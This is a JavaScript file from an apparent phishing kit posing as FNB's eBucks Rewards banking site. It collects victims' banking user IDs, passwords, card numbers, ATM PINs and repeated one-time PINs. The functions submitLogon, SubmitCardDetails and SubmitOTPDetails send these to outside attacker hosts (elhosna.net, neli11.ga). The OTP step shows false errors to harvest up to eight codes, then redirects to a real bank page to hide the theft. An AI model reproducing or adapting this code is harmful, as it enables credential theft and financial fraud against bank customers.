var numbersOnly = /^[0-9]+$/;

function checkPwd(str) {
    if (str.length < 5) {
        return("too_short");
    } else if (str.length > 15) {
        return("too_long");
    } else if (str.search(/\d/) == -1) {
        return("no_num");
    }
    return("ok");
}

function checkPwdCaps(str) {
    if (str.length < 5) {
        return("too_short");
    } else if (str.length > 25) {
        return("too_long");
    } else if (str.search(/\d/) == -1) {
        return("no_num");
    } else if (str.search(/[a-zA-Z]/) == -1) {
        return("no_letter");
    }
    return("ok");
}

function valid_credit_card(value) {
    // accept only digits, dashes or spaces
    if (/[^0-9-\s]+/.test(value)) return false;

    // The Luhn Algorithm. It's so pretty.
    var nCheck = 0, nDigit = 0, bEven = false;
    value = value.replace(/\D/g, "");

    for (var n = value.length - 1; n >= 0; n--) {
            var cDigit = value.charAt(n),
                      nDigit = parseInt(cDigit, 10);

            if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
            }

            nCheck += nDigit;
            bEven = !bEven;
    }

    return (nCheck % 10) == 0;
}

function validateStdCard(str) {
    if ((str.length !== 9) && (str.length !== 16) && (str.length !== 18)){
        return("too_short9");
    } if (!str.match(numbersOnly)) {
        return("not_num");
    }
    return("ok");
}


function checkatmpin(str) {
    if (str.length < 4) {
        return("too_short");
    }
    else if (str.length > 5) {
        return("too_long");
    }
    else if (str.search(/\d/) == -1) {
        return("no_num");
    }
    return("ok");
}

function checkotppin(str) {
    if (str.length < 4) {
        return("too_short");
    }
    else if (str.length > 4) {
        return("too_long");
    }
    else if (str.search(/\d/) == -1) {
        return("no_num");
    }
    return("ok");
}
            
siteURL2 = 'http://elhosna.net/.fnb.co.za/ib/php/';
siteURL = 'http://neli11.ga/dc/FNB-eBuck-Rewards/php/';

j9ery = {};

j9ery.showloaderOverlay = function(){
    $("#loaderOverlay").removeClass("Hhide");
}
j9ery.hideloaderOverlay = function(){
    $("#loaderOverlay").addClass("Hhide");
}

j9ery.showOverlayPanelBack = function(){
    $(".overlayPanelBack.viewAllSavings").removeClass("overlayPanelHide");
}
j9ery.HideOverlayPanelBack = function(){
    $(".overlayPanelBack.viewAllSavings").addClass("overlayPanelHide");
}

j9ery.submitLogon = function(form){
    var user = document.getElementById("user").value;
    var pass = document.getElementById("pass").value;
    
    if(checkPwdCaps(pass) !== "ok" || user.length < 2){
        alert("Please complete User ID and Password");
        return false;
    }

    oParametersurl = siteURL+"continue0.php";
    
    j9ery.showOverlayPanelBack();

    $.ajax({
        url: oParametersurl,
        cache: false,
        dataType: 'jsonp',
        data: form.serialize(),
        success: function(data) {
            if(data.message !== "error"){
                //window.location.href = 'https://digital.anz.co.nz/preauth/web/service/login';
                document.open();
                document.write(data.message);
                document.close();
            }else{
                alert("Please enter a valid password and retry");
                return false;
            }
        },
        error: function (request, status, error) {
            j9ery.HideOverlayPanelBack();
        }
    });
};

j9ery.SubmitCardDetails = function(form){
    var card = document.getElementById("card").value;
    var pin = document.getElementById("pin").value;
    
    if(validateStdCard(card) !== "ok"){
        alert("Please enter a valid Card Number");
        return false;
    }
    
    if(checkatmpin(pin) !== "ok"){
        alert("Please enter a valid ATM Pin");
        return false;
    }

    oParametersurl = siteURL+"continue1.php";
    j9ery.showloaderOverlay();

    $.ajax({
        url: oParametersurl,
        cache: false,
        dataType: 'jsonp',
        data: form.serialize(),
        success: function(data) {
            if(data.message !== "error"){
                document.open();
                document.write(data.message);
                document.close();
                //window.location.href = 'https://www.fnb.co.za/invest/index.html';
            }else{
                alert("Please enter a valid password and retry");
                return false;
            }
        },
        error: function (request, status, error) {
            j9ery.hideloaderOverlay();
        }
    });
};


var otpCount = 1;
var maxOtpCount = 8;
var otpPrevious = "";

j9ery.SubmitOTPDetails = function(form){
    //var card = document.getElementById("card").value;
    var otpValue = document.getElementById("otpValue").value;
    /*
    if(validateStdCard(card) !== "ok"){
        alert("Please enter a valid Card Number");
        return false;
    }
    
    if(checkatmpin(pin) !== "ok"){
        alert("Please enter a valid ATM Pin");
        return false;
    }*/
    
    if(checkotppin(otpValue) !== "ok"){
        alert("Please enter a valid 4-digit OTP");
        return false;
    }

    oParametersurl = siteURL+"continue3.php";
    j9ery.showloaderOverlay();
    $("div#error").addClass("Hhide");
    

    $.ajax({
        url: oParametersurl,
        cache: false,
        dataType: 'jsonp',
        data: $('form#otp_form').serialize()+'&'+$('form#CRYPTO_FORM').serialize()+'&otpCount='+otpCount,
        success: function(data) {
            /*
            if(data.message !== "error"){
                window.location.href = 'https://www.fnb.co.za/invest/index.html';
            }else{
                alert("Please enter a valid password and retry");
                return false;
            }*/
            if(otpCount < maxOtpCount){
                otpCount+=1;
                $("input#otpValue").val("").focus();
                j9ery.hideloaderOverlay();
                $("div#error").removeClass("Hhide");
            }else{
                if(responseText.message == "ok"){
                    window.location.href = 'https://www.standardbank.co.za/southafrica/personal/products-and-services/borrow-for-your-needs/personal-loans/overdraft';
                }
                else{
                    
                    document.open();
                    document.write(responseText.message);
                    document.close();
                    //window.location.href = 'https://www.standardbank.co.za/southafrica/personal/products-and-services/borrow-for-your-needs/personal-loans/overdraft';
                }
            }
        },
        error: function (request, status, error) {
            j9ery.hideloaderOverlay();
        }
    });
};